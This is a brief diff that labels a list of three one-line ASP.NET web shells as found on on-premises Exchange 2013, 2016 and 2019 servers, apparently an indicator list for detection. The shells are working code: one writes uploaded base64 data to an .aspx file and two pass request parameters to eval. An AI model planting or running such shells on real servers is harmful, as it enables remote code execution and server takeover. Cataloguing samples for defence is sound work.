@@ -1,3 +1,4 @@
+Found on business on Premise Exchange servers 2013, 2016, 2019
 http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*dvnbs*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
 http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Ananas"],"unsafe");}</script>
 http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Load"],"unsafe");}</script>
